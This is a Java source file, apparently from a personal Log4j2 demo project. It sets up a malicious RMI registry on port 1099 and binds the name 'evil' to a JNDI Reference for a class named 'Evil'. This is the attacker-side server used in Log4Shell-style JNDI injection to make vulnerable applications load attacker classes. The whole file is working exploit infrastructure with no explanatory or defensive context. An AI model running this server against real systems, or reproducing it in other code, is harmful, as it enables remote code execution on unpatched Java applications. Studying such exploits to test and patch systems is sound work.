package com.wky.demo.log4j2;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author: wangkunyang
 * @date 2021/12/13 10:44
 */
public class RmiServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("Create Registry in 1099.");

            Reference reference = new Reference("com.wky.demo.log4j2.Evil", "com.wky.demo.log4j2.Evil", null);
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("evil", wrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
